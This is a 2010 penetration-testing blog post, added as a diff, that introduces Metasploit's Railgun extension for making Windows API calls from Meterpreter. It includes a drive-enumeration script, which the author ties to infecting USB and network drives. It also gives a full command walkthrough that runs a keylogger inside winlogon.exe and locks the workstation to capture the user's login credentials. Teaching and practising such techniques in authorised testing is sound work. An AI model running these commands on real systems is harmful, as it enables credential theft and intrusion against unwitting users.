@@ -1,0 +1,113 @@
+---
+author: mubix
+comments: true
+date: 2010-07-08 02:10:34+00:00
+layout: post
+title: 'Intro to RailGun: WIN API for Meterpreter'
+categories:
+- metasploit
+- meterpreter
+- railgun
+---
+
+Back on June 13th, "Patrick HVE" released RAILGUN:
+
+[http://mail.metasploit.com/pipermail/framework/2010-June/006382.html](http://mail.metasploit.com/pipermail/framework/2010-June/006382.html)
+
+And it was merged into the the Metasploit trunk with 9709, 9710, 9711 and 9712:
+[http://www.metasploit.com/redmine/projects/framework/repository/revisions/9712](http://www.metasploit.com/redmine/projects/framework/repository/revisions/9712)
+
+Basically what this allows you to do is make Windows API calls from Meterpreter without compiling your own DLL. It currently supports a number of Windows API dlls:
+
+  * iphlpapi
+  * ws2_32
+  * kernel32
+  * ntdll
+  * user32
+  * advapi32
+
+(You can find out exactly what functions are available by default in the api.rb file)
+
+It's also very extensible, it doesn't have a DLL or function you need? But you can read all about in the manual:
+
+`./external/source/meterpreter/source/extensions/railgun/railgun_manual.pdf`
+
+Here are two examples where this comes in very handy:
+
+## List Drives:
+
+The problem that I've had on a number of pentests is that you get shell, but from CMD or Meterpreter there is no good way to find all of the volumes (drives) attached.
+
+  * net use - Shows you what Network drives are connected, but not physical ones
+  * fsutil fsinfo drives - You must be an administrator to ride this train
+  * fdisk /status - Only on OLD versions of DOS, not sure when this disappeared
+
+But railgun solves this problem with a really short script:
+
+```ruby
+# Load the Railgun plugin  **_Update: You no longer need this step_**  
+# client.core.use("railgun")   
+# Make the API call to enum drive letters   
+a = client.railgun.kernel32.GetLogicalDrives()["return"]         
+# Math magic to convert the binary to letters        
+drives = []         
+letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"         
+(0..25).each do |i|        
+	test = letters[i,1]        
+	rem = a % (2**(i+1))        
+	if rem > 0        
+		drives << test        
+		a = a - rem        
+	end        
+end         
+print_line("Drives Available = #{drives.inspect}")
+```
+
+**Output**: `Drives Available = ["A", "C", "D", "P", "X"]`
+
+Save this as a meterpreter script and it'll print every logical drive attached to the system even as a limited user (that the user can see).
+
+Logical drives include: (hdd, network, mass storage, optical, etc). This opens up the doors to infecting USB sticks and network drives…
+
+## JEDI KEYLOGGING:
+
+One of the problems with keylogging is you never know when that person will log in, and if you're using a client side, they have probably already logged in and you're hoping they log into a portal or some other password protected site.
+
+Railgun to the rescue again:
+
+```ruby
+# Start the keylogger running in the background dumping keys every 15 seconds, attached to Winlogon**   
+
+meterpreter > bgrun keylogrecorder -c 1 -t 15        
+[*] Executed Meterpreter with Job ID 0        
+meterpreter > [*] winlogon.exe Process found, migrating into 640        
+[*] Migration Successful!!        
+[*] Starting the keystroke sniffer...        
+[*] Keystrokes being saved in to /root/.msf3/logs/scripts/keylogrecorder/192.168.92.122_20100707.4539.txt        
+[*] Recording         
+  
+# Drop to IRB to initialize railgun and lockout the workstation, forcing the user to use their credentials again.**
+
+meterpreter > irb       
+[*] Starting IRB shell        
+[*] The 'client' variable holds the meterpreter client
+
+client.core.use("railgun")       
+=> true        
+client.railgun.user32.LockWorkStation()        
+=> {"GetLastError"=>0, "return"=>true}        
+exit        
+meterpreter >
+```
+
+Set up "tail -f" going on the log file for the keylogger and then kill the keylogger when you've gotten what you came for.
+
+```
+meterpreter > bglist       
+[*] Job 0: ["keylogrecorder", "-c", "1", "-t", "15"]        
+meterpreter > bgkill 0        
+[*] Killing background job 0...        
+meterpreter >
+```
+
+Hope you have fun with railgun and shoot me an email [mubix@hak5.org](mailto:mubix@hak5.org) or leave a comment if you have any other crazy uses for railgun.
